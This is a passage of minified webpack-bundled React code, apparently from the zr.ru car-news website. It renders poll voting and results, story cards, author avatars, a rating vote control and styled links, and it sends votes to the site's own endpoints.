            n = e.id,
            r = e.setAnswersId,
            l = e.setSuccess,
            c = e.setError,
            s = (0, o.I0)(),
            M = (0, Z.Ie)("poll", n);
          return a.createElement(a.Fragment, null, a.createElement(k.J9, {
            initialValues: {
              pollAnswer: i ? [] : ""
            },
            onSubmit: function (e) {
              if (e.pollAnswer.length) {
                var t = {
                  "poll_item_id[]": e.pollAnswer
                };
                r(Array.isArray(e.pollAnswer) ? e.pollAnswer : [e.pollAnswer]), fetch("https://www.zr.ru/IMP-poll", {
                  method: "POST",
                  headers: {
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8"
                  },
                  body: C.stringify(t)
                }).then(function (e) {
                  return e.json();
                }).then(function (e) {
                  l(!0), s((0, Q._1)(e));
                  var t = e.content.poll_vote;
                  (0, Z.cU)(M, t.poll);
                }).catch(function () {
                  return c("Что-то пошло не так. Попробуйте позднее");
                });
              }
            }
          }, function (e) {
            var n = e.handleSubmit,
              r = e.handleChange;
            return a.createElement(u, {
              onSubmit: n
            }, a.createElement(m, null, i && a.createElement("div", {
              style: {
                padding: "0 0 10px"
              }
            }, "Возможно несколько ответов"), t.map(function (e) {
              var t = e.name,
                n = e.id;
              return a.createElement(p, {
                key: n
              }, a.createElement(y, {
                type: i ? "checkbox" : "radio",
                name: "pollAnswer",
                onChange: r,
                value: n
              }), a.createElement(I, null, t));
            })), a.createElement(N, null, a.createElement(S.Z, {
              redText: !0,
              type: "submit"
            }, "Проголосовать")));
          }));
        }
        var U = i(2257),
          Y = i(2873),
          _ = function (e) {
            var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [],
              i = arguments.length > 2 ? arguments[2] : void 0;
            return "https://".concat(i, "/polls/").concat(e, "/?answers=").concat(null == t ? void 0 : t.join(","));
          };
        function W(e) {
          var t = e.items,
            i = void 0 === t ? [] : t,
            n = e.countAll,
            r = void 0 === n ? 0 : n,
            l = e.name,
            c = e.id,
            s = e.answersId,
            M = (0, o.v9)(Y.G6).serverName;
          return a.createElement(u, null, a.createElement(m, null, i.map(function (e) {
            var t = e.name,
              i = e.id,
              n = e.count,
              r = e.percent;
            return a.createElement(j, {
              key: i
            }, a.createElement(h, null, t), a.createElement(x, null, a.createElement(D, null, a.createElement(f, {
              $width: r
            })), a.createElement(w, null, n, " ", r && a.createElement(z, null, "(", r.toFixed(2), "%)"))));
          })), a.createElement(v, null, a.createElement(T, null, a.createElement(L, null, "Всего голосов:   ", r), a.createElement(A, null, a.createElement(b, null, "Поделиться результатом"), a.createElement(U.Z, {
            title: l || "Результаты опроса",
            url: _(c, s, M),
            image: "https://www.zr.ru/favicons/apple-touch-icon-152x152.png"
          }))), a.createElement(T, null, a.createElement(E, {
            href: "/polls/",
            color: "#0094f6"
          }, "Все опросы ЗР"))));
        }
        var G = i(8090);
        function R(e) {
          var t = e.isShadow,
            i = e.poll,
            n = e.showResults,
            l = (0, a.useState)(void 0),
            c = r()(l, 2),
            s = c[0],
            M = c[1],
            u = (0, a.useState)(!1),
            m = r()(u, 2),
            p = m[0],
            y = m[1],
            I = (0, a.useState)([]),
            N = r()(I, 2),
            j = N[0],
            h = N[1],
            x = (0, a.useState)(!1),
            D = r()(x, 2),
            f = D[0],
            w = D[1],
            z = (0, a.useState)(""),
            T = r()(z, 2),
            L = T[0],
            E = T[1],
            A = (0, o.v9)(function (e) {
              return (0, Y.Fw)(e, i.id);
            }) || s || i,
            b = A.dateStart,
            v = A.refStory,
            k = void 0 === v ? "" : v,
            C = A.name,
            S = A.pollItems,
            Q = A.active,
            U = A.voted,
            _ = A.countAll,
            R = A.multiple,
            H = (0, Z.Ie)("poll", i.id),
            B = function () {
              E(""), w(!1);
            };
          return (0, a.useEffect)(function () {
            var e = (0, Z.hA)(H);
            e && M(e), y(!0);
          }, []), n ? a.createElement(O, null, b && a.createElement(d, {
            date: b
          }), a.createElement(g, {
            href: k || "#",
            color: "#000"
          }, C), a.createElement(W, {
            items: S,
            countAll: _,
            id: i.id
          })) : a.createElement(O, {
            $isShadow: t,
            $isLoading: !p
          }, b && a.createElement(d, {
            date: b
          }), a.createElement(g, {
            href: k || "#",
            color: "#000"
          }, C), Q && !U ? a.createElement(P, {
            items: S,
            id: i.id,
            multiple: R || !1,
            setAnswersId: h,
            setSuccess: w,
            setError: E
          }) : a.createElement(W, {
            items: S,
            countAll: _,
            name: C,
            id: i.id,
            answersId: j
          }), L && a.createElement(G.Z, {
            type: "error",
            code: L,
            onClose: B
          }), f && a.createElement(G.Z, {
            type: "success",
            code: "user_voted",
            onClose: B
          }));
        }
      },
      2921: (e, t, i) => {
        i.d(t, {
          Z: () => u
        });
        var n = i(7154),
          r = i.n(n),
          a = i(6479),
          o = i.n(a),
          l = i(7294),
          c = i(9163),
          s = i(3727),
          M = "\n  text-decoration: none;\n  border-bottom: 0.0625rem solid transparent;\n  transition: 0.3s;\n  cursor: pointer;\n",
          d = c.ZP.a.withConfig({
            displayName: "styled__UiLink",
            componentId: "sc-11pfuhp-0"
          })(["", " color:", ";font-weight:", ";font-size:", ";width:", ";&:hover{border-color:", ";}"], M, function (e) {
            return e.$color ? e.$color : "#FFF";
          }, function (e) {
            return e.$weight ? e.$weight : 400;
          }, function (e) {
            return e.$fontSize ? "".concat(e.$fontSize, "px") : "inherit";
          }, function (e) {
            return e.$width ? "".concat(e.$width, "px") : "auto";
          }, function (e) {
            return e.$color ? e.$color : "#FFF";
          }),
          g = ((0, c.ZP)(s.rU).withConfig({
            displayName: "styled__RouterLink",
            componentId: "sc-11pfuhp-1"
          })(["", " color:", ";font-weight:", ";font-size:", "px;width:", ";&:hover{border-color:", ";}"], M, function (e) {
            return e.$color ? e.$color : "#FFF";
          }, function (e) {
            return e.$weight ? e.$weight : 400;
          }, function (e) {
            return e.$fontSize ? e.$fontSize : 16;
          }, function (e) {
            return e.$width ? "".concat(e.$width, "px") : "auto";
          }, function (e) {
            return e.$color ? e.$color : "#FFF";
          }), ["children", "color", "target", "href", "weight", "label", "fontSize", "width", "onClick"]);
        function u(e) {
          var t = e.children,
            i = void 0 === t ? null : t,
            n = e.color,
            a = e.target,
            c = e.href,
            s = e.weight,
            M = e.label,
            u = e.fontSize,
            m = e.width,
            p = e.onClick,
            y = o()(e, g),
            I = -1 === c.indexOf("https://") && -1 === c.indexOf("http://") || c.includes("https://www.zr.ru") ? "_self" : "_blank",
            N = a || I;
          return l.createElement(d, r()({}, y, {
            href: c,
            target: N,
            $color: n,
            $weight: s,
            $fontSize: u,
            $width: m,
            "aria-label": M,
            onClick: p
          }), i);
        }
      },
      2257: (e, t, i) => {
        i.d(t, {
          Z: () => n
        });
        const n = (0, i(2168).ZP)({
          resolved: {},
          chunkName: function () {
            return "shar";
          },
          isReady: function (e) {
            var t = this.resolve(e);
            return !0 === this.resolved[t] && !!i.m[t];
          },
          importAsync: function () {
            return Promise.all([i.e(216), i.e(431)]).then(i.bind(i, 3332));
          },
          requireAsync: function (e) {
            var t = this,
              i = this.resolve(e);
            return this.resolved[i] = !1, this.importAsync(e).then(function (e) {
              return t.resolved[i] = !0, e;
            });
          },
          requireSync: function (e) {
            var t = this.resolve(e);
            return i(t);
          },
          resolve: function () {
            return 3332;
          }
        });
      },
      257: (e, t, i) => {
        i.d(t, {
          Z: () => f
        });
        var n = i(7154),
          r = i.n(n),
          a = i(6479),
          o = i.n(a),
          l = i(7294),
          c = i(3493),
          s = i(671),
          M = i(7137),
          d = i(9163),
          g = i(8655),
          u = i(2921),
          m = (0, d.ZP)(u.Z).withConfig({
            displayName: "styled__TopStoryImg",
            componentId: "sc-110ufl9-0"
          })(['height:100%;display:block;background:no-repeat center center;background-size:cover;background-image:url("https://img.zr.ru', '=h600");@media (max-width:1024px){opacity:0.4;background-image:url("https://img.zr.ru', '=h240");}'], function (e) {
            return e.$image;
          }, function (e) {
            return e.$image;
          }),
          p = d.ZP.div.withConfig({
            displayName: "styled__TopStoryItemContainer",
            componentId: "sc-110ufl9-1"
          })(["display:block;padding:0.5rem 1rem;right:0;font-weight:700;position:absolute;bottom:0;left:0;background:-webkit-gradient(linear,left top,left bottom,from(transparent),to(black));color:#fff;box-sizing:border-box;", " @media (max-width:1024px){right:0;background:none;display:flex;align-items:flex-end;", "}"], (0, g.fq)("$kingSize", (0, d.iv)(["padding:2.8125rem 0.9375rem 2.5rem;"])), (0, g.fq)("$kingSize", (0, d.iv)(["padding:0 0.9375rem 0.5rem;background:-webkit-gradient( linear,left top,left bottom,from(rgba(0,0,0,0)),to(black) );background:linear-gradient(180deg,rgba(0,0,0,0) 0,#000 100%);"]))),
          y = d.ZP.div.withConfig({
            displayName: "styled__ItemCountersWrap",
            componentId: "sc-110ufl9-2"
          })(["float:right;font-size:0.625rem;color:#fff;flex-shrink:0;display:inline;margin:0 0 0 0.125rem;span{color:#fff;}@media (max-width:1024px){margin-left:auto;display:flex;flex-shrink:0;font-size:0.75rem;line-height:0.875rem;float:right;margin-top:0;}"]),
          I = d.ZP.div.withConfig({
            displayName: "styled__TopStoryTitle",
            componentId: "sc-110ufl9-3"
          })(["font-size:1.25rem;font-weight:700;line-height:1;"]),
          N = d.ZP.div.withConfig({
            displayName: "styled__TopStoryDescription",
            componentId: "sc-110ufl9-4"
          })(["font-size:1.125rem;line-height:1.2;margin-top:0.3125rem;font-weight:400;@media (max-width:1024px){height:25px;overflow:hidden;display:block;text-overflow:ellipsis;white-space:nowrap;font-size:1rem;line-height:1.4;margin-top:0;}"]),
          j = (0, d.ZP)(u.Z).withConfig({
            displayName: "styled__TopStoryItemLink",
            componentId: "sc-110ufl9-5"
          })(["color:#fff;display:inline;text-decoration:none;font-size:1.185rem;&:hover{border-color:transparent;}", " @media (max-width:1024px){", "{font-size:1rem;line-height:1.25rem;font-weight:700;margin-bottom:6px;}", "}"], (0, g.fq)("$kingSize", (0, d.iv)(["padding:2.8125rem 0.9375rem 2.5rem;", "{font-size:1.8125rem;}"], I)), I, (0, g.fq)("$kingSize", (0, d.iv)(["width:100%;position:relative;display:block;padding:0;", "{font-size:1.75rem;font-weight:400;}"], I))),
          h = d.ZP.div.withConfig({
            displayName: "styled__TopStoryItem",
            componentId: "sc-110ufl9-6"
          })(["width:33.33333%;padding-right:0.125rem;box-sizing:border-box;position:relative;height:175px;background:#eee;", " @media (max-width:1024px){width:calc(50% - 1px);height:150px;padding-right:0;background-color:#000;&:first-child{margin-right:2px;}&:last-child{display:none;}", " ", "}"], (0, g.fq)("$kingSize", (0, d.iv)(["width:100%;height:413px;padding-right:0;"])), (0, g.fq)("$kingSize", (0, d.iv)(["&:last-child{display:block;}&:first-child{margin-right:0;}width:100%;height:250px;padding-right:0;", "{font-weight:800;font-size:22px;line-height:1;margin-bottom:0.25rem;}", "{opacity:1;}"], I, m)), (0, g.fq)("$isSingle", (0, d.iv)(["width:calc(100% + 24px);margin:0 -12px 0 -12px;max-height:200px;padding:0;", "{display:none;}", "{font-weight:800;margin-bottom:1.5rem;font-size:1.3125rem;line-height:1.4375rem;}", "{position:absolute;bottom:5px;left:0;color:#ffffff;right:13px;display:flex;min-width:1px;align-items:flex-end;background:none;}", "{margin-left:auto;display:flex;flex-shrink:0;font-size:0.75rem;line-height:1.4375rem;position:absolute;right:0;bottom:0;}", "{filter:brightness(75%);vertical-align:top;}"], N, I, p, y, m))),
          x = i(6233),
          D = ["story", "kingSize", "isSingle", "withPreload", "hideCounters"];
        function f(e) {
          var t = e.story,
            i = e.kingSize,
            n = void 0 !== i && i,
            a = e.isSingle,
            d = void 0 !== a && a,
            g = e.withPreload,
            u = void 0 !== g && g,
            f = e.hideCounters,
            w = o()(e, D),
            z = (0, s.CH)(t),
            T = t.href,
            L = t.name,
            E = t.announcementXml,
            A = t.visitCounter,
            b = t.commentCounter;
          return l.createElement(h, r()({
            $kingSize: n,
            $isSingle: d
          }, w), z && T && l.createElement(l.Fragment, null, z.servingUrl && u && l.createElement(x.Z, {
            src: "https://img.zr.ru".concat(z.servingUrl)
          }), l.createElement(m, {
            href: T,
            $kingSize: n,
            $image: z.servingUrl || "",
            label: L
          })), l.createElement(p, {
            $kingSize: n
          }, T && l.createElement(j, {
            href: T,
            $kingSize: n
          }, l.createElement(I, null, L), n && E && l.createElement(N, null, (0, M.d0)(E)), !f && l.createElement(y, null, l.createElement(c.Z, {
            visits: A,
            comments: b
          })))));
        }
      },
      8526: (e, t, i) => {
        i.d(t, {
          bZ: () => v.Z,
          I7: () => m.Z,
          Lq: () => lt,
          IY: () => w,
          qE: () => f,
          bu: () => Ue.Z,
          zx: () => ce.Z,
          Im: () => ee,
          Mj: () => u.Z,
          y5: () => pe,
          Ee: () => D.Z,
          LU: () => ot.Z,
          UP: () => Ke,
          pZ: () => d.Z,
          rk: () => re,
          s8: () => Z.Z,
          yN: () => S.Z,
          hM: () => ae,
          rH: () => n.Z,
          UI: () => he,
          mB: () => C.Z,
          R6: () => M,
          Fh: () => le,
          WG: () => be,
          m2: () => Pe,
          Y: () => g.Z,
          su: () => at,
          v1: () => k
        });
        var n = i(2921),
          r = i(6479),
          a = i.n(r),
          o = i(7294),
          l = i(9163),
          c = l.ZP.div.withConfig({
            displayName: "styled__SidebarItem",
            componentId: "sc-10mt9lv-0"
          })(["&:not(:last-child){margin-bottom:0.875rem;}"]),
          s = ["children"];
        function M(e) {
          var t = e.children,
            i = a()(e, s);
          return o.createElement(c, i, t);
        }
        var d = i(3493),
          g = i(257),
          u = i(1416),
          m = i(2718),
          p = l.ZP.div.withConfig({
            displayName: "styled__Avatar",
            componentId: "sc-11689y8-0"
          })(["line-height:", ";"], function (e) {
            return e.$avatarSize ? "".concat(e.$avatarSize, "px") : "unset";
          }),
          y = (0, l.ZP)(n.Z).withConfig({
            displayName: "styled__AuthorLink",
            componentId: "sc-11689y8-1"
          })(["line-height:", ";img{margin-right:6px;}"], function (e) {
            return e.$avatarSize ? "".concat(e.$avatarSize, "px") : "unset";
          }),
          I = l.ZP.span.withConfig({
            displayName: "styled__AuthorName",
            componentId: "sc-11689y8-2"
          })(["color:#723b86;cursor:pointer;text-decoration:none;border-bottom:0.0625rem solid transparent;transition:0.3s;&:hover{border-color:#000;}"]),
          N = l.ZP.span.withConfig({
            displayName: "styled__AuthorText",
            componentId: "sc-11689y8-3"
          })(["line-height:30px;"]),
          j = i(9386);
        const h = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MCIgaGVpZ2h0PSI2MCIgIHhtbDpzcGFjZT0icHJlc2VydmUiPjxjaXJjbGUgY3g9IjMwIiBjeT0iMzAiIHI9IjMwIiBzdHlsZT0iZmlsbDojZmZmIi8+PHBhdGggZD0iTTQ2IDQzLjhjLTEtMS0yLjktMi00LTItMSAwLTEtMS0xLTIgMC0zIC4zLTExLjkgMC0xNi0xLTEyLTMuMy0xNS4zLTctMTktMy0zLTgtNC0xMS0zLTMuOSAxLjMtOC40IDQuMi0xMCA5LTEgMy0zLjQgMjIuMi01IDI3LTEgMy00IDItNSA1LjJhMzAgMzAgMCAwIDAgNDYuOSA5LjVjLS4yLTEuMy0uNS01LjMtMy45LTguN3ptLTUgNWMtMi00LTIuOS01LjYtNS04LTIgNS00LjkgMTctNSAxNy00LjItNS4xLTcuOC0xMC4zLTEyLjEtMTUuNS0yLjggMS40LTMuOSAzLjUtNi45IDUuNS0xLTMgMi0xMiA2LTE0IDAgMiA0IDkgNSAxMCAyIDIgNCA1IDcgOCAxLjItMi41IDMtNyAzLTEwIDAtNS0xLTYtMS04IDQgMiA4LjUgOC42IDkgMTV6IiBzdHlsZT0iZmlsbDojY2RjZWQwIi8+PC9zdmc+",
          x = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMCIgaGVpZ2h0PSIzMCIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+CiAgPGNpcmNsZSBjeD0iMTUiIGN5PSIxNSIgcj0iMTUiIGZpbGw9IiNmZmYiLz4KICA8cGF0aCBkPSJNMTQgMjdjMCAxIDEgMyAxIDNhMTUgMTUgMCAwIDEtMTMuMi04TDggMThsNCA3IDItMiAxIDEuM1MxNCAyNiAxNCAyN3ptMy4yIDIuOGExNSAxNSAwIDAgMCA3LjktMy43TDE3IDIwbDIgNC0zLTEgMSAxLTEgMWMyIDIgMS4yIDQuOCAxLjIgNC44ek05IDE4bDYgNCAyLTN2LTJzMSAwIDItMiAyLTkgMS0xMS0yLTMtNi0zLTYgMi02IDR2MlM3IDcgNyA4cy41IDMuNSAxIDQgMSAwIDEgMXY1eiIgZmlsbD0iI2NkY2VkMCIvPgo8L3N2Zz4K";
        var D = i(2996);
        function f(e) {
          var t = e.user,
            i = e.url,
            n = e.withoutAvatar,
            r = e.size,
            a = void 0 === r ? 32 : r,
            l = t || {},
            c = l.sex,
            s = l.avatar;
          return s && !n ? o.createElement(D.Z, {
            picture: s,
            size: a,
            objectFit: "cover",
            borderRadius: 50
          }) : i ? o.createElement(D.Z, {
            noFormatUrl: !0,
            url: i,
            width: a,
            height: a,
            objectFit: "cover",
            borderRadius: 50
          }) : o.createElement(o.Fragment, null, c && 2 == c.id ? o.createElement(D.Z, {
            noFormatUrl: !0,
            url: h,
            width: a,
            height: a,
            borderRadius: 50,
            objectFit: "cover"
          }) : o.createElement(D.Z, {
            noFormatUrl: !0,
            url: x,
            width: a,
            height: a,
            objectFit: "cover",
            borderRadius: 50
          }));
        }
        function w(e) {
          var t = e.advertisment,
            i = e.partnerStory,
            n = e.author,
            r = e.avatarSize,
            a = e.textAuthor,
            l = e.withoutAvatar;
          if (t || i) return o.createElement(p, null, o.createElement(f, {
            url: j.Z,
            size: 30
          }));
          if (a) return o.createElement("span", null, o.createElement(N, null, !l && o.createElement(f, {
            url: j.Z,
            size: 30
          }), o.createElement(I, null, a)));
          if (!n) return null;
          var c = n.href,
            s = n.name;
          return o.createElement("span", null, o.createElement(y, {
            $avatarSize: r,
            href: c || ""
          }, o.createElement(f, {
            withoutAvatar: l,
            user: n,
            size: 30
          }), o.createElement(I, null, s)));
        }
        var z = i(3038),
          T = i.n(z),
          L = i(8655),
          E = l.ZP.button.withConfig({
            displayName: "styled__VoteButton",
            componentId: "sc-1mho7p2-0"
          })(["appearence:none;cursor:pointer;transition:0.3;background-color:transparent;border:none;padding:0;img{max-width:100%;height:auto;color:transparent;}"]),
          A = l.ZP.span.withConfig({
            displayName: "styled__VoteValue",
            componentId: "sc-1mho7p2-1"
          })(["font-weight:700;margin:0 0.3125rem;object-fit:contain;color:#000;vertical-align:middle;font-size:", ";", " ", ""], function (e) {
            return e.$fontSize ? "".concat(e.$fontSize, "px") : "15px";
          }, (0, L.fq)("$green", (0, l.iv)(["color:#34bf48;"])), (0, L.fq)("$red", (0, l.iv)(["color:#ff0000;"]))),
          b = i(7563),
          v = i(8090),
          O = i(7137);
        function k(e) {
          var t = e.width,
            i = e.height,
            n = e.ratingPlus,
            r = void 0 === n ? 0 : n,
            a = e.ratingMinus,
            l = void 0 === a ? 0 : a,
            c = e.localPrefix,
            s = e.id,
            M = e.type,
            d = e.fontSize,
            g = (0, o.useState)(0),
            u = T()(g, 2),
            m = u[0],
            p = u[1],
            y = (0, o.useState)(0),
            I = T()(y, 2),
            N = I[0],
            j = I[1],
            h = (0, o.useState)(),
            x = T()(h, 2),
            f = x[0],
            w = x[1],
            z = (0, o.useState)(!1),
            L = T()(z, 2),
            k = L[0],
            C = L[1],
            S = (0, o.useState)(!1),
            Z = T()(S, 2),
            Q = Z[0],
            P = Z[1],
            U = (0, o.useState)(!1),
            Y = T()(U, 2),
            _ = Y[0],
            W = Y[1],
            G = Math.abs(l),
            R = Math.max(r, m),
            H = Math.max(G, N),
            B = (0, O.Ie)(c, s),
            F = R - H;
          (0, o.useEffect)(function () {
            var e = (0, O.hA)(B);
            if (e) {
              var t = e.ratingLocalPlus,
                i = e.ratingLocalMinus;
              p(t), j(i), C(!0);
            }
          }, []), (0, o.useEffect)(function () {
            if (k) {
              var e = 1 === f ? R + 1 : R,
                t = -1 === f ? H + 1 : H,
                i = {
                  ratingLocalPlus: e,
                  ratingLocalMinus: t
                };
              p(e), j(t), (0, O.cU)(B, i);
            }
          }, [k]);
          var J = function (e) {
            var t = "plus" === e;
            k && W(!0), k && _ || fetch("https://www.zr.ru/IMP-vote", {
              method: "POST",
              headers: {
                "content-type": "application/x-www-form-urlencoded;charset=UTF-8"
              },
              body: b.stringify({
                id: s,
                type: M,
                weight: t ? 1 : -1
              })
            }).then(function (e) {
              return e.json();
            }).then(function (e) {
              var i = e.content.main;
              i && i.success && w(t ? 1 : -1);
            }).catch(function (e) {
              console.log(e), P(!0);
            }).finally(function () {
              return C(!0);
            });
          };
          return o.createElement("div", {
            "data-id": s,
            "data-type": M
          }, o.createElement(E, null, o.createElement(D.Z, {
            noFormatUrl: !0,
            url: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTEiIHN0cm9rZT0iIzAwQzAwMCIgc3Ryb2tlLXdpZHRoPSIyIi8+PHBhdGggZD0iTTYgMTJoMTJtLTYtNnYxMiIgc3Ryb2tlPSIjMDBDMDAwIiBzdHJva2Utd2lkdGg9IjIiLz48L3N2Zz4=",
            altText: "Проголосовать за",
            width: t,
            height: i,
            onClick: function () {
              return J("plus");
            }
          })), o.createElement(A, {
            $green: F > 0,
            $red: F < 0,
            $fontSize: d
          }, F > 0 ? "+".concat(F) : F), o.createElement(E, null, o.createElement(D.Z, {
            noFormatUrl: !0,
            url: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTEiIHN0cm9rZT0icmVkIiBzdHJva2Utd2lkdGg9IjIiLz48cGF0aCBkPSJNNiAxMmgxMiIgc3Ryb2tlPSJyZWQiIHN0cm9rZS13aWR0aD0iMiIvPjwvc3ZnPg==",
            altText: "Проголосовать против",
            width: t,
            height: i,
            onClick: function () {
              return J("minus");
            }
          })), Q && o.createElement(v.Z, {
            message: "Упс! Что-то пошло не так. Попробуйте еще раз.",
            type: "error"
          }), _ && o.createElement(v.Z, {
            message: "Вы уже голосовали за этот вопрос!",
            type: "warning"
          }));
        }
        var C = i(2257),
          S = i(9145),
          Z = i(3225),
          Q = l.ZP.div.withConfig({
            displayName: "styled__ModelReview",
            componentId: "sc-5rdmfz-0"
          })(["border-bottom:1px solid #dadadc;margin-bottom:25px;padding-bottom:10px;h2,h3{padding-left:0;}"]),
          P = (0, l.ZP)(n.Z).withConfig({
            displayName: "styled__ReviewTitle",
            componentId: "sc-5rdmfz-1"
          })(["border-bottom-color:rgba(0,0,0,0.3);margin-bottom:1.25rem;", ""], (0, L.fq)("$hideTitle", (0, l.iv)(["display:none;"]))),
          U = l.ZP.span.withConfig({
            displayName: "styled__ReviewCount",
            componentId: "sc-5rdmfz-2"
          })(["color:#c5c5c5;font-weight:400;font-size:21px;"]),
          Y = (l.ZP.div.withConfig({
            displayName: "styled__ReviewPublisher",
            componentId: "sc-5rdmfz-3"
          })(["margin-top:15px;float:left;"]), l.ZP.div.withConfig({
            displayName: "styled__ReviewDate",
            componentId: "sc-5rdmfz-4"
          })(["font-size:12px;color:#ababab;margin-left:5px;display:inline-block;text-transform:uppercase;padding:0 3.375rem 0 4rem;"]), l.ZP.div.withConfig({
            displayName: "styled__ReviewRating",
            componentId: "sc-5rdmfz-5"
          })(["display:inline-block;width:36px;position:relative;height:36px;background-image:url(", ");background-repeat:no-repeat;background-position:0 0;", ""], "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzYiIGhlaWdodD0iMzMiIHZpZXdCb3g9IjAgMCAzNiAzMyIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTE4IDBMMjIuMDQxMyAxMi40Mzc3SDM1LjExOUwyNC41Mzg5IDIwLjEyNDZMMjguNTgwMSAzMi41NjIzTDE4IDI0Ljg3NTRMNy40MTk4NyAzMi41NjIzTDExLjQ2MTEgMjAuMTI0NkwwLjg4MDk4MyAxMi40Mzc3SDEzLjk1ODdMMTggMFoiIGZpbGw9IiNEOUQ5RDkiLz4KPC9zdmc+Cg==", (0, L.fq)("$red", (0, l.iv)(["background-image:url(", ");background-repeat:no-repeat;background-position:0 0;"], "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzYiIGhlaWdodD0iMzMiIHZpZXdCb3g9IjAgMCAzNiAzMyIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGcgZmlsdGVyPSJ1cmwoI2ZpbHRlcjBfaV8zMzNfNDIyKSI+CjxwYXRoIGQ9Ik0xOCAwTDIyLjA0MTMgMTIuNDM3N0gzNS4xMTlMMjQuNTM4OSAyMC4xMjQ2TDI4LjU4MDEgMzIuNTYyM0wxOCAyNC44NzU0TDcuNDE5ODcgMzIuNTYyM0wxMS40NjExIDIwLjEyNDZMMC44ODA5ODMgMTIuNDM3N0gxMy45NTg3TDE4IDBaIiBmaWxsPSIjRDkwMDAwIi8+CjwvZz4KPGRlZnM+CjxmaWx0ZXIgaWQ9ImZpbHRlcjBfaV8zMzNfNDIyIiB4PSIwLjg4MTEwNCIgeT0iMCIgd2lkdGg9IjM3LjIzOCIgaGVpZ2h0PSIzNC41NjIzIiBmaWx0ZXJVbml0cz0idXNlclNwYWNlT25Vc2UiIGNvbG9yLWludGVycG9sYXRpb24tZmlsdGVycz0ic1JHQiI+CjxmZUZsb29kIGZsb29kLW9wYWNpdHk9IjAiIHJlc3VsdD0iQmFja2dyb3VuZEltYWdlRml4Ii8+CjxmZUJsZW5kIG1vZGU9Im5vcm1hbCIgaW49IlNvdXJjZUdyYXBoaWMiIGluMj0iQmFja2dyb3VuZEltYWdlRml4IiByZXN1bHQ9InNoYXBlIi8+CjxmZUNvbG9yTWF0cml4IGluPSJTb3VyY2VBbHBoYSIgdHlwZT0ibWF0cml4IiB2YWx1ZXM9IjAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDEyNyAwIiByZXN1bHQ9ImhhcmRBbHBoYSIvPgo8ZmVPZmZzZXQgZHg9IjMiIGR5PSIyIi8+CjxmZUdhdXNzaWFuQmx1ciBzdGREZXZpYXRpb249IjYuNSIvPgo8ZmVDb21wb3NpdGUgaW4yPSJoYXJkQWxwaGEiIG9wZXJhdG9yPSJhcml0aG1ldGljIiBrMj0iLTEiIGszPSIxIi8+CjxmZUNvbG9yTWF0cml4IHR5cGU9Im1hdHJpeCIgdmFsdWVzPSIwIDAgMCAwIDAuMjYyNzQ1IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMC4zNCAwIi8+CjxmZUJsZW5kIG1vZGU9Im5vcm1hbCIgaW4yPSJzaGFwZSIgcmVzdWx0PSJlZmZlY3QxX2lubmVyU2hhZG93XzMzM180MjIiLz4KPC9maWx0ZXI+CjwvZGVmcz4KPC9zdmc+Cg==")))),
          _ = l.ZP.div.withConfig({
            displayName: "styled__ModelInfo",
            componentId: "sc-5rdmfz-6"
          })(["margin-bottom:18px;font-weight:700;"]),
          W = l.ZP.span.withConfig({
            displayName: "styled__ModelYear",
            componentId: "sc-5rdmfz-7"
          })(["font-size:21px;font-weight:700;"]),
          G = l.ZP.span.withConfig({
            displayName: "styled__Delimeter",
            componentId: "sc-5rdmfz-8"
          })(["color:#ababab;font-weight:400;font-size:21px;margin-left:6px;"]),
          R = l.ZP.span.withConfig({
            displayName: "styled__ReviewPurchase",
            componentId: "sc-5rdmfz-9"
          })(["font-weight:400;font-size:21px;"]),
          H = l.ZP.div.withConfig({
            displayName: "styled__ReviewText",
            componentId: "sc-5rdmfz-10"
          })(["margin-bottom:10px;font-size:18px;@media (max-width:768px){font-size:17px;}"]),
          B = l.ZP.div.withConfig({
            displayName: "styled__ReviewPlaceholder",
            componentId: "sc-5rdmfz-11"
          })(["font-size:1.5rem;font-weight:700;padding:0;"]),
          F = l.ZP.div.withConfig({
            displayName: "styled__RatingContainer",
            componentId: "sc-5rdmfz-12"
          })(["display:flex;flex-flow:row wrap;align-items:center;justify-content:flex-start;margin-bottom:17px;margin-top:15px;"]),
          J = l.ZP.div.withConfig({
            displayName: "styled__RatingText",
            componentId: "sc-5rdmfz-13"
          })(["display:inline-block;font-size:18px;font-weight:700;margin-left:20px;@media (max-width:768px){margin-left:0;font-size:17px;}"]),
          V = l.ZP.div.withConfig({
            displayName: "styled__ReviewSub",
            componentId: "sc-5rdmfz-14"
          })(["font-size:21px;font-weight:700;"]),
          $ = l.ZP.div.withConfig({
            displayName: "styled__VoteControlcontainer",
            componentId: "sc-5rdmfz-15"
          })(["display:flex;flex-flow:row;justify-content:flex-end;"]),
          q = l.ZP.div.withConfig({
            displayName: "styled__Model",
            componentId: "sc-5rdmfz-16"
          })(["display:inline-block;@media (max-width:768px){display:block;}"]),
          X = i(6026),
          K = i.n(X);
        function ee(e) {
          var t = e.carModel,
            i = e.carReview,
            r = e.hideTitle,
            a = void 0 !== r && r;
          if (i && t) {
            var l = i.carYear,
              c = i.carReviewTenure,
              s = i.plus,
              M = i.minus,
              d = i.comment,
              g = i.rating,
